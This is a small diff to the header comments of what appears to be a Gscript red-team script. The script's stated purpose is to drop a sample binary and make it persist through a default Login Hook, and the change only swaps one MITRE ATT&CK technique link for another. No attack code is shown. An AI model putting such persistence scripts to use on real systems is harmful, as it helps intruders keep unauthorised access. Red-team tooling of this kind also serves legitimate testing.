@@ -3,7 +3,7 @@
 // Author: ahhh
 // Purpose: Drop a sample binary and persist it using a default Login Hook
 // Gscript version: 1.0.0
-// ATT&CK: https://attack.mitre.org/wiki/Technique/T1037
+// ATT&CK: https://attack.mitre.org/techniques/T1164/
 
 //priority:90
 //timeout:150
